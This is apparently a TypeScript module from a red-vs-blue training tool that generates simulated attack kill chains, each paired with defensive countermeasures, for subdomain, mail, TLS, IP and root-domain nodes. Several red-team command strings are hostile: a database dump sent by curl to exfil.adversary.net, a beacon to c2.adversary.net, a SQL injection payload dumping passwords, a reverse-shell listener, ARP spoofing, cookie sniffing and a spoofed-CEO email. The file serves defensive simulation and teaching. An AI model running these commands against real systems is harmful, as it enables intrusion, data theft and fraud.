/**
 * ShadowTrace - Tactical Kill-Chain Simulation Engine (Red vs Blue Arena)
 * Standard: IEEE Std 830-1998 Tactical Perimeter Defense & Threat Modeling
 * Generates context-aware 5-stage attack kill-chains and defensive countermeasures
 * for any perimeter node in the attack graph.
 */

import type { KillChainStep, NodeAttackSimulation, TopologyNodeData } from "../types/scanner";

export function generateNodeSimulation(
  nodeId: string,
  nodeData: TopologyNodeData,
  domain: string
): NodeAttackSimulation {
  const type = nodeData.type || "root";
  const label = nodeData.label || domain;
  const isCritical = nodeData.severity === "critical";

  let killChain: KillChainStep[] = [];

  switch (type) {
    case "subdomain":
      killChain = [
        {
          stage: "Reconnaissance",
          mitreId: "T1596.001",
          mitreTactic: "Reconnaissance: Search Open Technical Databases",
          redTeamTitle: "Passive Subdomain & CT Log Enumeration",
          redTeamAction: `Adversary queries public Certificate Transparency logs for ${label} to discover dangling cloud alias pointers.`,
          redTeamCommand: `curl -s "https://crt.sh/?q=${encodeURIComponent(label)}&output=json" | jq -r '.[].name_value' | sort -u`,
          blueTeamCountermeasure: "Deploy passive Certificate Transparency log monitors (Certstream) for immediate alerts on new cert issuances.",
          blueTeamDetectionRule: "Alert on unauthorized SSL certificate issuances matching corporate domain tree via CAA records.",
          blueTeamRemediationSnippet: `# Enforce strict DNS Certification Authority Authorization (RFC 6844)
${domain}. IN CAA 0 issue "letsencrypt.org"
${domain}. IN CAA 0 iodef "mailto:security@${domain}"`,
          cvssScore: 5.3,
          severity: "info",
        },
        {
          stage: "Weaponization",
          mitreId: "T1584.004",
          mitreTactic: "Resource Development: DNS Server Takeover",
          redTeamTitle: "Dangling CNAME Resolution & Orphan Verification",
          redTeamAction: `Querying canonical name pointers for ${label} to identify orphaned AWS S3, Azure Blob, GitHub Pages, or Heroku instances.`,
          redTeamCommand: `dig CNAME ${label} +short`,
          blueTeamCountermeasure: "Audit all external canonical aliases before decommissioning backend cloud buckets or hosting endpoints.",
          blueTeamDetectionRule: "Automate daily unresolvable CNAME scans returning NXDOMAIN against edge DNS zone files.",
          cvssScore: 7.5,
          severity: isCritical ? "critical" : "warning",
        },
        {
          stage: "Delivery",
          mitreId: "T1566.002",
          mitreTactic: "Initial Access: Spearphishing Link via Trusted Subdomain",
          redTeamTitle: "Staging Fake Authentication Portal on Claimed Subdomain",
          redTeamAction: `Hosting a credential harvester on ${label} inheriting corporate trust and bypassing cookie scope restrictions.`,
          redTeamCommand: `curl -I "https://${label}/login"`,
          blueTeamCountermeasure: "Enforce strict cookie domain scoping (__Host- prefix) preventing session leakage to subdomains.",
          blueTeamDetectionRule: "Monitor perimeter ingress logs for anomalous HTTP POST volumes to newly provisioned endpoints.",
          cvssScore: 8.2,
          severity: "critical",
        },
        {
          stage: "Exploitation",
          mitreId: "T1190",
          mitreTactic: "Exploitation for Credential Theft",
          redTeamTitle: "Stealing Corporate SSO Tokens & Session Cookies",
          redTeamAction: "Extracting OAuth Bearer tokens transmitted due to parent-domain wildcard cookie configuration.",
          redTeamCommand: `curl -s "https://${label}/api/auth/token" -H "Cookie: session=REDACTED"`,
          blueTeamCountermeasure: "Use SameSite=Strict and remove Domain=.target.com attributes from high-privilege session cookies.",
          blueTeamDetectionRule: "Detect cross-subdomain API token reuse in WAF session logs.",
          cvssScore: 9.1,
          severity: "critical",
        },
        {
          stage: "Action on Objectives",
          mitreId: "T1078.004",
          mitreTactic: "Impact: Enterprise Account Takeover",
          redTeamTitle: "Complete Identity Compromise & Lateral Cloud Ingress",
          redTeamAction: "Utilizing captured administrative tokens to access internal AWS/Azure control plane resources.",
          redTeamCommand: `aws sts get-caller-identity --output json`,
          blueTeamCountermeasure: "Enforce Phishing-Resistant FIDO2/WebAuthn MFA and Conditional Access device-binding policies.",
          blueTeamDetectionRule: "SIEM alert on anomalous cloud console login from unrecognized geographic ASN.",
          cvssScore: 9.8,
          severity: "critical",
        },
      ];
      break;

    case "mx":
      killChain = [
        {
          stage: "Reconnaissance",
          mitreId: "T1596.005",
          mitreTactic: "Reconnaissance: DNS Record Harvest",
          redTeamTitle: "Mail Gateway & MX Topology Enumeration",
          redTeamAction: `Adversary queries MX priority nodes for ${domain} to identify third-party security filters or direct mail servers.`,
          redTeamCommand: `dig MX ${domain} +noall +answer`,
          blueTeamCountermeasure: "Restrict MX records strictly to hardened email security gateways (e.g. Proofpoint, Mimecast, Google Workspace).",
          blueTeamDetectionRule: "Inspect inbound SMTP connection telemetry for anomalous scanning bursts.",
          cvssScore: 4.3,
          severity: "info",
        },
        {
          stage: "Weaponization",
          mitreId: "T1566.002",
          mitreTactic: "Resource Development: Forged Email Templates",
          redTeamTitle: "Evaluating SPF Mechanism & RFC 7208 PermError Limits",
          redTeamAction: "Checking if SPF policy contains ~all (SoftFail) or exceeds the strict 10-DNS lookup limit causing PermError fallback.",
          redTeamCommand: `dig TXT ${domain} +short | grep -i "v=spf1"`,
          blueTeamCountermeasure: "Flatten SPF records to prevent exceeding 10 DNS lookups and replace ~all with hard -all enforcement.",
          blueTeamDetectionRule: "SIEM monitor for DMARC aggregate XML reports (RUA) receiving SPF PermError failures.",
          blueTeamRemediationSnippet: `# Hardened SPF with strict -all rejection
${domain}. IN TXT "v=spf1 include:_spf.google.com -all"`,
          cvssScore: 6.8,
          severity: "warning",
        },
        {
          stage: "Delivery",
          mitreId: "T1566.001",
          mitreTactic: "Initial Access: Direct Spearphishing Inundation",
          redTeamTitle: "Spoofed Executive Wire Transfer / Urgent Payroll Lure",
          redTeamAction: `Transmitting synthetic email with 'From: ceo@${domain}' directly to internal accounting personnel.`,
          redTeamCommand: `swaks --to finance@${domain} --from "ceo@${domain}" --server ${label} --body "Urgent invoice payment required."`,
          blueTeamCountermeasure: "Configure DMARC policy with p=reject and sp=reject with 100% enforcement (pct=100).",
          blueTeamDetectionRule: "Inbound secure email gateway automatically drops unauthenticated mail failing DMARC alignment.",
          cvssScore: 8.6,
          severity: "critical",
        },
        {
          stage: "Exploitation",
          mitreId: "T1204.002",
          mitreTactic: "Execution: User Execution via Social Engineering",
          redTeamTitle: "Victim Action & Fraudulent Authorization",
          redTeamAction: "Recipient acts upon the authentic-looking message due to absence of DMARC reject banner or external warning tag.",
          redTeamCommand: `# Adversary observes confirmation callback via attacker-controlled C2
curl -s "https://c2.adversary.net/beacon?status=target_engaged"`,
          blueTeamCountermeasure: "Implement external email banner tagging and automated simulated phishing training campaigns.",
          blueTeamDetectionRule: "EDR telemetry detects user clicking unclassified external domain link inside email client.",
          cvssScore: 8.9,
          severity: "critical",
        },
        {
          stage: "Action on Objectives",
          mitreId: "T1565.001",
          mitreTactic: "Impact: Business Email Compromise (BEC)",
          redTeamTitle: "Unauthorized Wire Transfer & Financial Loss",
          redTeamAction: "Fraudulent fund disbursement executed before identity verification can intervene.",
          redTeamCommand: `# Attacker logs confirmed financial exfiltration
echo "BEC Target Objective Complete"`,
          blueTeamCountermeasure: "Multi-party out-of-band cryptographic authorization for all external wire transfers exceeding threshold.",
          blueTeamDetectionRule: "Financial audit anomaly detection flags unverified new routing number transfer request.",
          cvssScore: 9.6,
          severity: "critical",
        },
      ];
      break;

    case "tls":
      killChain = [
        {
          stage: "Reconnaissance",
          mitreId: "T1595.002",
          mitreTactic: "Reconnaissance: Vulnerability Scanning",
          redTeamTitle: "SSL/TLS Socket Handshake & Cipher Suite Audit",
          redTeamAction: `Adversary probes port 443 on ${domain} to detect legacy TLS 1.0/1.1 protocols or export-grade CBC ciphers.`,
          redTeamCommand: `sslscan --tlsall --no-colour ${domain}:443`,
          blueTeamCountermeasure: "Disable legacy TLS 1.0 and 1.1 across all web server configuration profiles; mandate TLS 1.2 and TLS 1.3.",
          blueTeamDetectionRule: "Monitor web server SSL handshake failure metrics for cipher downgrade scanning patterns.",
          cvssScore: 5.0,
          severity: "info",
        },
        {
          stage: "Weaponization",
          mitreId: "T1557.002",
          mitreTactic: "Credential Access: Adversary-in-the-Middle (AiTM)",
          redTeamTitle: "Certificate Expiration & Trust Chain Exploitation",
          redTeamAction: "Exploiting expired certificate or missing OCSP stapling to force untrusted connection exceptions in legacy clients.",
          redTeamCommand: `openssl s_client -connect ${domain}:443 -servername ${domain} -status`,
          blueTeamCountermeasure: "Automate ACME certificate renewal with Let's Encrypt / Certbot 30 days prior to expiration.",
          blueTeamDetectionRule: "Daily synthetic cert expiry monitoring alerting at 30, 14, and 7-day remaining thresholds.",
          blueTeamRemediationSnippet: `# Hardened Nginx TLS Configuration
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
ssl_prefer_server_ciphers off;
ssl_stapling on;
ssl_stapling_verify on;`,
          cvssScore: 7.2,
          severity: "warning",
        },
        {
          stage: "Delivery",
          mitreId: "T1557",
          mitreTactic: "Credential Access: Man-in-the-Middle Traffic Interception",
          redTeamTitle: "Rogue Wi-Fi / ARP Spoofing Traffic Intercept",
          redTeamAction: "Adversary intercepts plaintext traffic on compromised public networks where users bypass SSL warnings.",
          redTeamCommand: `arpspoof -i eth0 -t <VICTIM_IP> <GATEWAY_IP>`,
          blueTeamCountermeasure: "Enforce HSTS with preload directive: max-age=63072000; includeSubDomains; preload.",
          blueTeamDetectionRule: "Zero-trust network access (ZTNA) agents block client connection over untrusted public Wi-Fi without VPN.",
          cvssScore: 8.1,
          severity: "critical",
        },
        {
          stage: "Exploitation",
          mitreId: "T1539",
          mitreTactic: "Credential Access: Steal Web Session Cookie",
          redTeamTitle: "Decrypted Plaintext Extraction & Cookie Hijacking",
          redTeamAction: "Reading HTTP Authorization headers and session cookies from decrypted network stream.",
          redTeamCommand: `# Extracting session tokens from intercepted stream
tshark -i eth0 -Y 'http.cookie contains "session"' -T fields -e http.cookie`,
          blueTeamCountermeasure: "Set Secure attribute on all cookies ensuring transmission occurs strictly over verified TLS sockets.",
          blueTeamDetectionRule: "Detect session token reuse from non-originating IP address in application telemetry.",
          cvssScore: 8.8,
          severity: "critical",
        },
        {
          stage: "Action on Objectives",
          mitreId: "T1078",
          mitreTactic: "Persistence: Valid Accounts Access",
          redTeamTitle: "Session Impersonation & Internal Portal Access",
          redTeamAction: "Replaying extracted cookie into browser to achieve full authenticated dashboard session.",
          redTeamCommand: `curl -s "https://${domain}/dashboard" -H "Cookie: session=EXTRACTED_KEY"`,
          blueTeamCountermeasure: "Bind session tokens to client TLS fingerprint and IP subnet; rotate session ID on privilege change.",
          blueTeamDetectionRule: "WAF flags simultaneous sessions with identical cookie from geographically distant locations.",
          cvssScore: 9.3,
          severity: "critical",
        },
      ];
      break;

    case "ip":
      killChain = [
        {
          stage: "Reconnaissance",
          mitreId: "T1595.001",
          mitreTactic: "Reconnaissance: Active Port Scanning",
          redTeamTitle: "Bypassing Reverse Proxy WAF via Direct Origin IP",
          redTeamAction: `Directly probing backend server IP ${label} with custom Host header to bypass Cloudflare/Akamai inspection.`,
          redTeamCommand: `curl -kv -H "Host: ${domain}" https://${label}/`,
          blueTeamCountermeasure: "Deploy Cloudflare Tunnel (cloudflared) or restrict origin firewall (UFW/iptables) strictly to Cloudflare CIDR blocks.",
          blueTeamDetectionRule: "Detect direct IP HTTP connections in origin web server access logs bypassing edge reverse proxy.",
          blueTeamRemediationSnippet: `# UFW: Drop all direct public connections to port 80/443
sudo ufw default deny incoming
for ip in $(curl -s https://www.cloudflare.com/ips-v4); do
  sudo ufw allow from $ip to any port 443 proto tcp
done
sudo ufw reload`,
          cvssScore: 7.8,
          severity: "critical",
        },
        {
          stage: "Weaponization",
          mitreId: "T1595.002",
          mitreTactic: "Reconnaissance: Vulnerability Scanning",
          redTeamTitle: "Direct Port Scanning of Exposed Backend Infrastructure",
          redTeamAction: `Scanning non-HTTP ports on ${label} (e.g. 22 SSH, 3306 MySQL, 5432 Postgres, 6379 Redis) obscured by CDN edge.`,
          redTeamCommand: `nmap -Pn -sV -p 22,80,443,3306,5432,6379,8080 ${label}`,
          blueTeamCountermeasure: "Bind internal database and management services strictly to 127.0.0.1 or private VPC subnet interfaces.",
          blueTeamDetectionRule: "Fail2ban and cloud firewall alert on multiple port connection attempts to non-public listening sockets.",
          cvssScore: 8.2,
          severity: "critical",
        },
        {
          stage: "Delivery",
          mitreId: "T1190",
          mitreTactic: "Initial Access: Exploit Public-Facing Application",
          redTeamTitle: "Unfiltered SQL Injection / Remote Code Execution Attack",
          redTeamAction: "Transmitting exploit payloads directly to backend origin without WAF rate-limiting or OWASP signature inspection.",
          redTeamCommand: `curl -s "http://${label}/api/search?q=1'%20UNION%20SELECT%20username,password%20FROM%20users--" -H "Host: ${domain}"`,
          blueTeamCountermeasure: "Enforce parameterized SQL queries and input validation at the application tier, never relying solely on WAF edge.",
          blueTeamDetectionRule: "Application RASP (Runtime Application Self-Protection) agent intercepts and blocks unparameterized SQL query.",
          cvssScore: 9.4,
          severity: "critical",
        },
        {
          stage: "Exploitation",
          mitreId: "T1059.004",
          mitreTactic: "Execution: Command and Scripting Interpreter",
          redTeamTitle: "Spawning Reverse Shell on Origin Host",
          redTeamAction: "Executing remote command injection payload to establish outbound interactive shell connection.",
          redTeamCommand: `# Attacker listener receives reverse shell
nc -lvnp 4444`,
          blueTeamCountermeasure: "Run web application inside unprivileged container with read-only root filesystem and dropped capabilities.",
          blueTeamDetectionRule: "EDR agent flags web server process (nginx/node) spawning /bin/sh or outbound TCP socket to non-standard port.",
          cvssScore: 9.8,
          severity: "critical",
        },
        {
          stage: "Action on Objectives",
          mitreId: "T1567.002",
          mitreTactic: "Exfiltration: Exfiltration Over Web Service",
          redTeamTitle: "Database Dump & Complete Infrastructure Compromise",
          redTeamAction: "Exfiltrating sensitive customer database tables directly to remote adversary repository.",
          redTeamCommand: `mysqldump -u root -p production_db | gzip | curl -T - https://exfil.adversary.net/`,
          blueTeamCountermeasure: "Apply egress firewall filtering on cloud host preventing outbound connections to unauthorized destinations.",
          blueTeamDetectionRule: "Cloud Network Watcher alerts on sudden multi-gigabyte outbound data transfer spike from backend tier.",
          cvssScore: 10.0,
          severity: "critical",
        },
      ];
      break;

    case "root":
    default:
      killChain = [
        {
          stage: "Reconnaissance",
          mitreId: "T1596.001",
          mitreTactic: "Reconnaissance: DNS Zone Walking & Boundary Enumeration",
          redTeamTitle: "Apex Footprint & Authoritative Nameserver Mapping",
          redTeamAction: `Harvesting authoritative nameserver clusters, SOA contact emails, and DNSSEC validation chains for ${domain}.`,
          redTeamCommand: `dig ${domain} ANY +noall +answer && dig DNSKEY ${domain} +multiline`,
          blueTeamCountermeasure: "Deploy DNSSEC with automated NSEC3 record signing to prevent zone-walking enumeration.",
          blueTeamDetectionRule: "Authoritative DNS service rate-limits anomalous ANY query volume from single resolver IPs.",
          cvssScore: 4.8,
          severity: "info",
        },
        {
          stage: "Weaponization",
          mitreId: "T1584.004",
          mitreTactic: "Resource Development: DNS Hijack Preparation",
          redTeamTitle: "Registrar Account Reconnaissance & Domain Expiry Monitoring",
          redTeamAction: `Auditing WHOIS registrar lock status (clientTransferProhibited) and nameserver delegation integrity for ${domain}.`,
          redTeamCommand: `whois ${domain} | grep -i -E "status|registrar|expiration"`,
          blueTeamCountermeasure: "Enable Registry Lock and multi-party MFA at the domain registrar to prevent unauthorized nameserver updates.",
          blueTeamDetectionRule: "Domain monitoring alerts on any whois contact modification or registrar status change.",
          cvssScore: 7.0,
          severity: "warning",
        },
        {
          stage: "Delivery",
          mitreId: "T1584",
          mitreTactic: "Initial Access: DNS Cache Poisoning / Sub-Delegation Hijack",
          redTeamTitle: "Poisoning Recursive Resolvers with Malicious Apex Pointer",
          redTeamAction: "Injecting forged A records for target domain into unvalidated upstream resolver caches.",
          redTeamCommand: `# Attacker broadcasts rogue forged DNS response
python3 -c 'print("DNS Spoofing Active")'`,
          blueTeamCountermeasure: "Enable DNSSEC validation at all recursive resolvers and configure upstream DoH/DoT endpoints.",
          blueTeamDetectionRule: "Resolver detects DNSSEC RRSIG cryptographic signature failure and returns SERVFAIL.",
          cvssScore: 8.5,
          severity: "critical",
        },
        {
          stage: "Exploitation",
          mitreId: "T1557",
          mitreTactic: "Credential Access: Enterprise Traffic Redirection",
          redTeamTitle: "Mass Traffic Interception & Phishing Redirection",
          redTeamAction: "Legitimate enterprise users routed to attacker-controlled mirror site harvesting credentials.",
          redTeamCommand: `curl -I "https://${domain}/" --resolve "${domain}:443:<ATTACKER_IP>"`,
          blueTeamCountermeasure: "Deploy Certificate Transparency monitoring to catch rogue certificates issued for intercepted domain traffic.",
          blueTeamDetectionRule: "Security operations center flags sudden traffic drop on primary CDN edge telemetry.",
          cvssScore: 9.3,
          severity: "critical",
        },
        {
          stage: "Action on Objectives",
          mitreId: "T1499.004",
          mitreTactic: "Impact: Total Service Takeover & Domain Defacement",
          redTeamTitle: "Brand Reputation Destruction & Lateral Credential Access",
          redTeamAction: "Complete disruption of corporate communications, payment gateways, and employee authentication portals.",
          redTeamCommand: `# Complete apex hijacking established
echo "Perimeter Taken Over"`,
          blueTeamCountermeasure: "Immediate emergency incident response plan with pre-authorized registrar out-of-band recovery channel.",
          blueTeamDetectionRule: "Global synthetic uptime monitors trigger P1 incident alert across executive security pager channels.",
          cvssScore: 9.9,
          severity: "critical",
        },
      ];
      break;
  }

  return {
    nodeId,
    nodeLabel: label,
    nodeType: type,
    killChain,
  };
}
